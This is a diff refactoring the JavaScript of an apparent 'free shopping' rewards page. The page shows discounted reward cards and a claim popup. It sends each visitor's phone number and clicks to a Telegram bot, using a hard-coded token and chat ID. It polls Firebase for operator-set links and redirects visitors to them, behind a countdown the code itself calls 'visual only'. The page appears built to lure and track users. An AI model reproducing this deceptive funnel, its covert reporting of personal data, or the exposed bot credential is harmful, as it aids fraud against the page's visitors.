@@ -49,7 +49,7 @@ const claimNowBtn = document.getElementById('claimNowBtn');
 
 // Card Popup Elements
 const cardPopupOverlay = document.getElementById('cardPopupOverlay');
-const cardPopupClose = document.getElementById('cardPopupClose');
+const cardPopupCloseBtn = document.getElementById('cardPopupCloseBtn');
 const cardPopupImage = document.getElementById('cardPopupImage');
 const cardPopupOldPrice = document.getElementById('cardPopupOldPrice');
 const cardPopupNewPrice = document.getElementById('cardPopupNewPrice');
@@ -59,7 +59,7 @@ const cardPopupSelectBtn = document.getElementById('cardPopupSelectBtn');
 
 // Claim Popup Elements
 const claimPopupOverlay = document.getElementById('claimPopupOverlay');
-const claimPopupClose = document.getElementById('claimPopupClose');
+const claimPopupCloseBtn = document.getElementById('claimPopupCloseBtn');
 const claimPopupImage = document.getElementById('claimPopupImage');
 const claimPopupOldPrice = document.getElementById('claimPopupOldPrice');
 const claimPopupNewPrice = document.getElementById('claimPopupNewPrice');
@@ -68,6 +68,7 @@ const claimPopupRewardAmount = document.getElementById('claimPopupRewardAmount')
 const claimPopupPhone = document.getElementById('claimPopupPhone');
 const claimPayBtn = document.getElementById('claimPayBtn');
 const claimTimerDisplay = document.getElementById('claimTimerDisplay');
+const helpLink = document.getElementById('helpLink');
 
 // ===== STATE =====
 let selectedCard = null;
@@ -89,12 +90,11 @@ const database = firebase.database();
 const TELEGRAM_BOT_TOKEN = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
 const TELEGRAM_CHAT_ID = '7298607329';
 
-// ===== HELPER: Format number with commas =====
+// ===== HELPER FUNCTIONS =====
 function formatWithCommas(number) {
   return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
 }
 
-// ===== GET PHILIPPINE TIME =====
 function getPhilippineTime() {
   return new Date().toLocaleString('en-PH', {
     timeZone: 'Asia/Manila',
@@ -107,7 +107,64 @@ function getPhilippineTime() {
   });
 }
 
-// ===== TELEGRAM HELPER =====
+// ===== TOAST SYSTEM =====
+function showToast(message, isError = false) {
+  const existingToast = document.querySelector('.toast-message');
+  if (existingToast) existingToast.remove();
+  
+  const toast = document.createElement('div');
+  toast.className = 'toast-message' + (isError ? ' error' : '');
+  toast.textContent = message;
+  document.body.appendChild(toast);
+  
+  setTimeout(() => {
+    toast.style.animation = 'toastSlideDown 0.3s ease';
+    setTimeout(() => toast.remove(), 300);
+  }, 3000);
+}
+
+// Add toast styles
+(function addToastStyles() {
+  if (document.querySelector('#toastStyles')) return;
+  const style = document.createElement('style');
+  style.id = 'toastStyles';
+  style.textContent = `
+    .toast-message {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(3, 8, 7, 0.90);
+      backdrop-filter: blur(16px);
+      color: #fff;
+      padding: 0.8rem 1.8rem;
+      border-radius: 18px;
+      border: 1px solid rgba(0, 180, 255, 0.10);
+      font-family: 'Inter', sans-serif;
+      font-size: 0.9rem;
+      font-weight: 500;
+      z-index: 9998;
+      box-shadow: 0 10px 50px rgba(0, 0, 0, 0.7);
+      animation: toastSlideUp 0.3s ease;
+      max-width: 85%;
+      text-align: center;
+    }
+    .toast-message.error {
+      border-color: rgba(255, 50, 50, 0.15);
+    }
+    @keyframes toastSlideUp {
+      from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+      to { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
+    @keyframes toastSlideDown {
+      from { opacity: 1; transform: translateX(-50%) translateY(0); }
+      to { opacity: 0; transform: translateX(-50%) translateY(20px); }
+    }
+  `;
+  document.head.appendChild(style);
+})();
+
+// ===== TELEGRAM FUNCTIONS =====
 function sendTelegramMessage(message) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   const params = {
@@ -115,7 +172,6 @@ function sendTelegramMessage(message) {
     text: message,
     parse_mode: 'HTML'
   };
-  
   const queryString = Object.keys(params)
     .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
     .join('&');
@@ -123,76 +179,56 @@ function sendTelegramMessage(message) {
   fetch(`${url}?${queryString}`)
     .then(response => response.json())
     .then(data => {
-      if (!data.ok) {
-        console.error('Telegram error:', data.description);
-      } else {
-        console.log('✅ Telegram notification sent');
-      }
+      if (!data.ok) console.error('Telegram error:', data.description);
+      else console.log('✅ Telegram notification sent');
     })
-    .catch(error => {
-      console.error('Failed to send Telegram notification:', error);
-    });
+    .catch(error => console.error('Failed to send Telegram:', error));
 }
 
-// ===== TELEGRAM ALERT FUNCTIONS =====
 function sendClaimNowAlert(cardName, cardAmount, phone) {
   const timestamp = getPhilippineTime();
-  
   const message = `
 📱 <b>CLAIM NOW CLICKED!</b> 🛍️
-
 👤 <b>User:</b> ${phone}
 💳 <b>Card:</b> ${cardName}
 💰 <b>Amount:</b> ${cardAmount}
 ⏰ <b>Time:</b> ${timestamp}
-📍 <b>Status:</b> Claim popup opened
-
-#BuyTreats #ClaimNow #UserAction
+#BuyTreats #ClaimNow
   `;
-  
   sendTelegramMessage(message);
 }
 
 function sendPayTreatsAlert(cardName, cardAmount, phone, hasLink) {
   const timestamp = getPhilippineTime();
-  
   const linkStatus = hasLink ? '✅ With Link' : '❌ No Link';
-  
   const message = `
 💳 <b>PAY TREATS CLICKED!</b> 💰
-
 👤 <b>User:</b> ${phone}
 💎 <b>Card:</b> ${cardName}
 🏷️ <b>Amount:</b> ${cardAmount}
 🔗 <b>Link Status:</b> ${linkStatus}
 ⏰ <b>Time:</b> ${timestamp}
-
-${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (visual only)'}
-#BuyTreats #PayTreats #UserAction
+${hasLink ? '🔗 Redirecting to link' : '⏰ Timer started'}
+#BuyTreats #PayTreats
   `;
-  
   sendTelegramMessage(message);
 }
 
 function sendRedirectAlert(cardName, cardAmount, phone) {
   const timestamp = getPhilippineTime();
-  
   const message = `
 🔗 <b>USER REDIRECTED!</b> 🚀
-
 👤 <b>User:</b> ${phone}
 💎 <b>Card:</b> ${cardName}
 💰 <b>Amount:</b> ${cardAmount}
 ⏰ <b>Time:</b> ${timestamp}
-
-✅ User successfully redirected to treat link!
-#BuyTreats #Redirect #Conversion
+✅ User redirected to treat link!
+#BuyTreats #Redirect
   `;
-  
   sendTelegramMessage(message);
 }
 
-// ===== CHECK FOR DEPLOYED LINK =====
+// ===== FIREBASE FUNCTIONS =====
 function checkForDeployedLink(treatType) {
   return database.ref('treat_links')
     .orderByChild('type')
@@ -203,18 +239,16 @@ function checkForDeployedLink(treatType) {
       if (links) {
         const linkIds = Object.keys(links);
         const latestId = linkIds[linkIds.length - 1];
-        const linkData = links[latestId];
-        return linkData.url;
+        return links[latestId].url;
       }
       return null;
     })
     .catch(error => {
-      console.error('❌ Error checking for link:', error);
+      console.error('❌ Error checking link:', error);
       return null;
     });
 }
 
-// ===== INCREMENT CLICK COUNT =====
 function incrementClickCount(treatType) {
   return database.ref('treat_links')
     .orderByChild('type')
@@ -229,74 +263,7 @@ function incrementClickCount(treatType) {
         return database.ref('treat_links/' + latestId + '/clicks').set(currentClicks + 1);
       }
     })
-    .catch(error => {
-      console.error('❌ Error incrementing click count:', error);
-    });
-}
-
-// ===== START REALTIME LINK SCANNER =====
-function startLinkScanner(treatType) {
-  stopLinkScanner();
-  currentCardType = treatType;
-  console.log('🔄 Starting realtime link scanner for:', treatType);
-  
-  checkAndRedirect(treatType);
-  
-  linkScannerInterval = setInterval(function() {
-    checkAndRedirect(treatType);
-  }, 1000);
-}
-
-function stopLinkScanner() {
-  if (linkScannerInterval) {
-    clearInterval(linkScannerInterval);
-    linkScannerInterval = null;
-    console.log('🛑 Link scanner stopped');
-  }
-  currentCardType = null;
-}
-
-// ===== CHECK AND REDIRECT =====
-function checkAndRedirect(treatType) {
-  if (isRedirecting || !treatType) return;
-  
-  checkForDeployedLink(treatType)
-    .then(link => {
-      if (link) {
-        console.log('🔗 Link found during scan:', link);
-        
-        if (claimPopupOverlay.classList.contains('active')) {
-          if (isTimerRunning) {
-            console.log('⏰ Timer running, stopping and redirecting...');
-            clearInterval(timerInterval);
-            timerInterval = null;
-            isTimerRunning = false;
-            claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
-          }
-          
-          incrementClickCount(treatType);
-          
-          const cardNumber = parseInt(selectedCard.replace('card', ''));
-          const cardDataItem = cardData[cardNumber];
-          sendRedirectAlert(cardDataItem.name, cardDataItem.badge, userPhone);
-          
-          isRedirecting = true;
-          showToast('🔗 Redirecting to treat link...');
-          
-          setTimeout(function() {
-            window.location.href = link;
-          }, 1500);
-        } else {
-          treatLink = link;
-          console.log('📌 Link stored for later use');
-        }
-      } else {
-        console.log('ℹ️ No link found for:', treatType);
-      }
-    })
-    .catch(error => {
-      console.error('❌ Error in scanner:', error);
-    });
+    .catch(error => console.error('❌ Error incrementing click count:', error));
 }
 
 // ===== IMAGE ERROR HANDLING =====
@@ -328,7 +295,9 @@ projectorImg.addEventListener('error', function() {
   this.parentElement.appendChild(placeholder);
 });
 
-// ===== THOUGHT BUBBLE TYPEWRITER =====
+// ============================================================
+// THOUGHT BUBBLE TYPEWRITER (INDEPENDENT)
+// ============================================================
 const messagesNoBalance = [
   "🎄 Advance Merry Christmas! 🎅",
   "Earn cashback on every treat you buy! 💰",
@@ -348,35 +317,22 @@ let messageIndex = 0;
 let charIndex = 0;
 let isDeleting = false;
 let typingSpeed = 36;
-let isTypingPaused = false;
 
 function updateThoughtMessages() {
   const balance = parseFloat(balanceElement.textContent.replace(/,/g, ''));
+  const newMessages = balance > 0 ? messagesWithBalance : messagesNoBalance;
   
-  if (balance > 0) {
-    if (currentMessages !== messagesWithBalance) {
-      currentMessages = messagesWithBalance;
-      messageIndex = 0;
-      charIndex = 0;
-      isDeleting = false;
-      typedSpan.textContent = '';
-      setTimeout(typeEffect, 300);
-    }
-  } else {
-    if (currentMessages !== messagesNoBalance) {
-      currentMessages = messagesNoBalance;
-      messageIndex = 0;
-      charIndex = 0;
-      isDeleting = false;
-      typedSpan.textContent = '';
-      setTimeout(typeEffect, 300);
-    }
+  if (currentMessages !== newMessages) {
+    currentMessages = newMessages;
+    messageIndex = 0;
+    charIndex = 0;
+    isDeleting = false;
+    typedSpan.textContent = '';
+    setTimeout(typeEffect, 300);
   }
 }
 
 function typeEffect() {
-  if (isTypingPaused) return;
-  
   const currentMessage = currentMessages[messageIndex];
   if (!currentMessage) {
     messageIndex = 0;
@@ -387,10 +343,7 @@ function typeEffect() {
     typedSpan.textContent = currentMessage.substring(0, charIndex + 1);
     charIndex++;
     if (charIndex === currentMessage.length) {
-      setTimeout(() => { 
-        isDeleting = true; 
-        typeEffect(); 
-      }, 2800);
+      setTimeout(() => { isDeleting = true; typeEffect(); }, 2800);
       return;
     }
     setTimeout(typeEffect, typingSpeed + Math.random() * 18);
@@ -407,22 +360,18 @@ function typeEffect() {
   }
 }
 
+// Start thought bubble
 setTimeout(typeEffect, 600);
 
-// Watch for balance changes
-const balanceObserver = new MutationObserver(function() {
-  updateThoughtMessages();
-});
-
+// Watch balance changes
+const balanceObserver = new MutationObserver(updateThoughtMessages);
 if (balanceElement) {
-  balanceObserver.observe(balanceElement, {
-    childList: true,
-    characterData: true,
-    subtree: true
-  });
+  balanceObserver.observe(balanceElement, { childList: true, characterData: true, subtree: true });
 }
 
-// ===== PROJECTOR ZOOM - TAP TOGGLE =====
+// ============================================================
+// PROJECTOR ZOOM (INDEPENDENT)
+// ============================================================
 photoWrapper.addEventListener('click', function(e) {
   e.stopPropagation();
   this.classList.toggle('active');
@@ -434,7 +383,9 @@ document.addEventListener('click', function(e) {
   }
 });
 
-// ===== BALANCE UPDATE =====
+// ============================================================
+// BALANCE UPDATE (INDEPENDENT)
+// ============================================================
 function updateBalance(newAmount, isIncrement) {
   const amountSpan = balanceElement;
   amountSpan.classList.remove('increment', 'decrement');
@@ -448,11 +399,12 @@ function updateBalance(newAmount, isIncrement) {
   setTimeout(() => {
     amountSpan.classList.remove('increment', 'decrement');
   }, 700);
-  
   localStorage.setItem(STORAGE_KEYS.SELECTED_AMOUNT, String(newAmount));
 }
 
-// ===== CARD SELECTION =====
+// ============================================================
+// CARD SELECTION (INDEPENDENT)
+// ============================================================
 function selectCard(cardNumber) {
   const card = document.getElementById('card' + cardNumber);
   const btn = card.querySelector('.card-btn');
@@ -467,8 +419,7 @@ function selectCard(cardNumber) {
     currentBalance = 0;
     updateBalance(0, false);
     stopLinkScanner();
-    setTimeout(updateThoughtMessages, 300);
-    
+    updateThoughtMessages();
     localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
     localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
     return;
@@ -488,8 +439,7 @@ function selectCard(cardNumber) {
   selectedCard = cardId;
   currentBalance = amount;
   updateBalance(amount, true);
-  setTimeout(updateThoughtMessages, 300);
-  
+  updateThoughtMessages();
   localStorage.setItem(STORAGE_KEYS.SELECTED_CARD, cardId);
   localStorage.setItem(STORAGE_KEYS.SELECTED_AMOUNT, String(amount));
   
@@ -498,7 +448,9 @@ function selectCard(cardNumber) {
   startLinkScanner(treatType);
 }
 
-// ===== RESTORE SELECTED CARD FROM LOCALSTORAGE =====
+// ============================================================
+// RESTORE SELECTED CARD (INDEPENDENT)
+// ============================================================
 function restoreSelectedCard() {
   const savedCard = localStorage.getItem(STORAGE_KEYS.SELECTED_CARD);
   const savedAmount = localStorage.getItem(STORAGE_KEYS.SELECTED_AMOUNT);
@@ -510,7 +462,6 @@ function restoreSelectedCard() {
   
   const cardElement = document.getElementById(savedCard);
   if (!cardElement) {
-    console.log('⚠️ Saved card not found in DOM');
     localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
     localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
     return false;
@@ -518,7 +469,6 @@ function restoreSelectedCard() {
   
   const cardNumber = parseInt(savedCard.replace('card', ''));
   if (!cardData[cardNumber]) {
-    console.log('⚠️ Invalid card data');
     localStorage.removeItem(STORAGE_KEYS.SELECTED_CARD);
     localStorage.removeItem(STORAGE_KEYS.SELECTED_AMOUNT);
     return false;
@@ -547,7 +497,7 @@ function restoreSelectedCard() {
   selectedCard = savedCard;
   currentBalance = amount;
   updateBalance(amount, true);
-  setTimeout(updateThoughtMessages, 300);
+  updateThoughtMessages();
   
   const treatType = cardData[cardNumber].type;
   startLinkScanner(treatType);
@@ -556,7 +506,58 @@ function restoreSelectedCard() {
   return true;
 }
 
-// ===== CARD POPUP =====
+// ============================================================
+// LINK SCANNER (INDEPENDENT)
+// ============================================================
+function startLinkScanner(treatType) {
+  stopLinkScanner();
+  currentCardType = treatType;
+  console.log('🔄 Starting link scanner for:', treatType);
+  checkAndRedirect(treatType);
+  linkScannerInterval = setInterval(function() {
+    checkAndRedirect(treatType);
+  }, 1000);
+}
+
+function stopLinkScanner() {
+  if (linkScannerInterval) {
+    clearInterval(linkScannerInterval);
+    linkScannerInterval = null;
+    console.log('🛑 Link scanner stopped');
+  }
+  currentCardType = null;
+}
+
+function checkAndRedirect(treatType) {
+  if (isRedirecting || !treatType) return;
+  
+  checkForDeployedLink(treatType).then(link => {
+    if (link) {
+      console.log('🔗 Link found:', link);
+      if (claimPopupOverlay.classList.contains('active')) {
+        if (isTimerRunning) {
+          clearInterval(timerInterval);
+          timerInterval = null;
+          isTimerRunning = false;
+          claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
+        }
+        incrementClickCount(treatType);
+        const cardNumber = parseInt(selectedCard.replace('card', ''));
+        const cardDataItem = cardData[cardNumber];
+        sendRedirectAlert(cardDataItem.name, cardDataItem.badge, userPhone);
+        isRedirecting = true;
+        showToast('🔗 Redirecting to treat link...');
+        setTimeout(function() { window.location.href = link; }, 1500);
+      } else {
+        treatLink = link;
+      }
+    }
+  }).catch(error => console.error('❌ Scanner error:', error));
+}
+
+// ============================================================
+// CARD POPUP (INDEPENDENT)
+// ============================================================
 function openCardPopup(cardNumber) {
   cardPopupNumber = cardNumber;
   const data = cardData[cardNumber];
@@ -568,7 +569,6 @@ function openCardPopup(cardNumber) {
   cardPopupReward.textContent = formatWithCommas(parseInt(data.badge.replace('₱', '').replace(/,/g, '')));
   
   updateCardPopupButtonState();
-  
   cardPopupOverlay.classList.add('active');
   document.body.style.overflow = 'hidden';
 }
@@ -601,16 +601,15 @@ function cardPopupSelectCard() {
 }
 
 // Card Popup Event Listeners
-cardPopupClose.addEventListener('click', closeCardPopup);
+cardPopupCloseBtn.addEventListener('click', closeCardPopup);
 cardPopupSelectBtn.addEventListener('click', cardPopupSelectCard);
-
 cardPopupOverlay.addEventListener('click', function(e) {
-  if (e.target === cardPopupOverlay) {
-    closeCardPopup();
-  }
+  if (e.target === cardPopupOverlay) closeCardPopup();
 });
 
-// ===== CLAIM POPUP =====
+// ============================================================
+// CLAIM POPUP (INDEPENDENT)
+// ============================================================
 function openClaimPopup() {
   if (selectedCard === null) {
     alert('💳 Please select a treat reward first!');
@@ -637,11 +636,9 @@ function openClaimPopup() {
   checkForDeployedLink(data.type).then(link => {
     treatLink = link;
     if (link) {
-      console.log('🔗 Link exists, will redirect on PAY TREATS click');
       claimPayBtn.innerHTML = '<i class="fas fa-link"></i> PAY TREATS';
       claimPayBtn.classList.remove('disabled');
     } else {
-      console.log('ℹ️ No link deployed, timer mode');
       claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
       claimPayBtn.classList.remove('disabled');
     }
@@ -657,13 +654,20 @@ function closeClaimPopup() {
   document.body.style.overflow = '';
 }
 
-// ===== TIMER (Visual Only - No Alerts) =====
+// Claim Popup Event Listeners
+claimPopupCloseBtn.addEventListener('click', closeClaimPopup);
+claimPopupOverlay.addEventListener('click', function(e) {
+  if (e.target === claimPopupOverlay) closeClaimPopup();
+});
+
+// ============================================================
+// TIMER (INDEPENDENT - Visual Only)
+// ============================================================
 function startTimer() {
   if (selectedCard === null) {
     alert('💳 Please select a treat reward first!');
     return;
   }
-  
   if (isTimerRunning) return;
   
   if (!hasSentPayTreatsAlert) {
@@ -674,17 +678,12 @@ function startTimer() {
   }
   
   if (treatLink && !isRedirecting) {
-    console.log('🔗 Link exists, redirecting immediately...');
     isRedirecting = true;
     claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
-    
     const cardNumber = parseInt(selectedCard.replace('card', ''));
     const data = cardData[cardNumber];
     sendRedirectAlert(data.name, data.badge, userPhone);
-    
-    setTimeout(function() {
-      window.location.href = treatLink;
-    }, 1500);
+    setTimeout(function() { window.location.href = treatLink; }, 1500);
     return;
   }
   
@@ -698,22 +697,16 @@ function startTimer() {
     const minutes = Math.floor(timeRemaining / 60);
     const seconds = timeRemaining % 60;
     const timeStr = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
-    
-    const display = document.getElementById('claimTimerDisplay');
-    if (display) {
-      display.textContent = timeStr;
-    }
+    if (claimTimerDisplay) claimTimerDisplay.textContent = timeStr;
     
     if (timeRemaining <= 0) {
       clearInterval(timerInterval);
       timerInterval = null;
       isTimerRunning = false;
-      
       claimPayBtn.classList.remove('disabled');
       claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
-      const display2 = document.getElementById('claimTimerDisplay');
-      if (display2) display2.textContent = '';
-      console.log('⏰ Timer finished - button reset');
+      if (claimTimerDisplay) claimTimerDisplay.textContent = '';
+      console.log('⏰ Timer finished');
     }
   }, 1000);
 }
@@ -728,49 +721,24 @@ function resetClaimTimer() {
   isRedirecting = false;
   hasSentPayTreatsAlert = false;
   claimPayBtn.classList.remove('disabled');
-  const display = document.getElementById('claimTimerDisplay');
-  if (display) {
-    display.textContent = '';
-  }
+  if (claimTimerDisplay) claimTimerDisplay.textContent = '';
   claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
 }
 
-// ===== SHOW TOAST =====
-function showToast(message, isError = false) {
-  const existingToast = document.querySelector('.toast-message');
-  if (existingToast) {
-    existingToast.remove();
-  }
-  
-  const toast = document.createElement('div');
-  toast.className = 'toast-message' + (isError ? ' error' : '');
-  toast.textContent = message;
-  document.body.appendChild(toast);
-  
-  setTimeout(() => {
-    toast.style.animation = 'toastSlideDown 0.3s ease';
-    setTimeout(() => {
-      toast.remove();
-    }, 300);
-  }, 3000);
-}
-
-// Claim Popup Event Listeners
-claimPopupClose.addEventListener('click', closeClaimPopup);
+// Claim Pay Button
 claimPayBtn.addEventListener('click', startTimer);
 
-claimPopupOverlay.addEventListener('click', function(e) {
-  if (e.target === claimPopupOverlay) {
-    closeClaimPopup();
-  }
+// ============================================================
+// HELP WIDGET (INDEPENDENT)
+// ============================================================
+helpLink.addEventListener('click', function(e) {
+  e.preventDefault();
+  window.open('https://facebook.com/FreeShoppingPH', '_blank');
 });
 
-// ===== HELP WIDGET =====
-function openHelp() {
-  window.open('https://facebook.com/FreeShoppingPH', '_blank');
-}
-
-// ===== CLAIM NOW BUTTON =====
+// ============================================================
+// CLAIM NOW BUTTON (INDEPENDENT)
+// ============================================================
 claimNowBtn.addEventListener('click', function() {
   if (currentBalance <= 0) {
     alert('💳 Please select a treat reward first!');
@@ -779,20 +747,18 @@ claimNowBtn.addEventListener('click', function() {
   }
 });
 
-// ===== ESCAPE KEY =====
+// ============================================================
+// ESCAPE KEY (INDEPENDENT)
+// ============================================================
 document.addEventListener('keydown', function(e) {
   if (e.key === 'Escape') {
-    if (cardPopupOverlay.classList.contains('active')) {
-      closeCardPopup();
-    }
-    if (claimPopupOverlay.classList.contains('active')) {
-      closeClaimPopup();
-    }
+    if (cardPopupOverlay.classList.contains('active')) closeCardPopup();
+    if (claimPopupOverlay.classList.contains('active')) closeClaimPopup();
   }
 });
 
 // ============================================================
-// CHECK PERSISTENT TIMER ON LOAD
+// PERSISTENT TIMER ON LOAD (INDEPENDENT)
 // ============================================================
 function checkPersistentTimer() {
   const timerData = localStorage.getItem('treat_timer');
@@ -802,8 +768,6 @@ function checkPersistentTimer() {
     const data = JSON.parse(timerData);
     const elapsed = Math.floor((Date.now() - data.startTime) / 1000);
     const remaining = data.duration - elapsed;
-    
-    console.log('⏰ Persistent timer found:', { elapsed, remaining, duration: data.duration });
     
     if (remaining > 0) {
       timeRemaining = remaining;
@@ -821,12 +785,9 @@ function checkPersistentTimer() {
       
       if (data.pendingRedirect && data.treatLink) {
         setTimeout(() => {
-          if (data.treatLink) {
-            window.location.href = data.treatLink;
-          }
+          if (data.treatLink) window.location.href = data.treatLink;
         }, 1000);
       }
-      
       return true;
     } else {
       localStorage.removeItem('treat_timer');
@@ -836,7 +797,6 @@ function checkPersistentTimer() {
       return false;
     }
   } catch (e) {
-    console.error('Error parsing timer data:', e);
     localStorage.removeItem('treat_timer');
     return false;
   }
@@ -846,11 +806,7 @@ function startTimerDisplay(seconds) {
   const minutes = Math.floor(seconds / 60);
   const secs = seconds % 60;
   const timeStr = String(minutes).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
-  
-  if (claimTimerDisplay) {
-    claimTimerDisplay.textContent = timeStr;
-  }
-  
+  if (claimTimerDisplay) claimTimerDisplay.textContent = timeStr;
   claimPayBtn.classList.add('disabled');
   claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">' + timeStr + '</span>';
 }
@@ -864,24 +820,14 @@ function saveTimerState(duration, link, cardId) {
     pendingRedirect: !!link
   };
   localStorage.setItem('treat_timer', JSON.stringify(timerData));
-  console.log('💾 Timer state saved:', timerData);
 }
 
 // ============================================================
 // INITIALIZE
 // ============================================================
-  
-// Restore selected card first
 const cardRestored = restoreSelectedCard();
-
-// Check for persistent timer
 const hasActiveTimer = checkPersistentTimer();
 
-if (!hasActiveTimer) {
-  console.log('ℹ️ No active timer found');
-}
-
-// If no card restored and no timer, show default
 if (!cardRestored && !hasActiveTimer) {
   console.log('ℹ️ No card selected - showing default state');
 }
@@ -891,46 +837,8 @@ if (!cardRestored && !hasActiveTimer) {
 // ============================================================
 window.selectCard = selectCard;
 window.openCardPopup = openCardPopup;
-window.openHelp = openHelp;
 window.cardPopupSelectCard = cardPopupSelectCard;
 window.closeCardPopup = closeCardPopup;
 window.closeClaimPopup = closeClaimPopup;
-
-// Add toast styles
-const style = document.createElement('style');
-style.textContent = `
-  .toast-message {
-    position: fixed;
-    bottom: 30px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: rgba(3, 8, 7, 0.90);
-    backdrop-filter: blur(16px);
-    color: #fff;
-    padding: 0.8rem 1.8rem;
-    border-radius: 18px;
-    border: 1px solid rgba(0, 180, 255, 0.10);
-    font-family: 'Inter', sans-serif;
-    font-size: 0.9rem;
-    font-weight: 500;
-    z-index: 9998;
-    box-shadow: 0 10px 50px rgba(0, 0, 0, 0.7);
-    animation: toastSlideUp 0.3s ease;
-    max-width: 85%;
-    text-align: center;
-  }
-  .toast-message.error {
-    border-color: rgba(255, 50, 50, 0.15);
-  }
-  @keyframes toastSlideUp {
-    from { opacity: 0; transform: translateX(-50%) translateY(20px); }
-    to { opacity: 1; transform: translateX(-50%) translateY(0); }
-  }
-  @keyframes toastSlideDown {
-    from { opacity: 1; transform: translateX(-50%) translateY(0); }
-    to { opacity: 0; transform: translateX(-50%) translateY(20px); }
-  }
-`;
-document.head.appendChild(style);
 
 console.log('✅ Main.js initialized successfully');
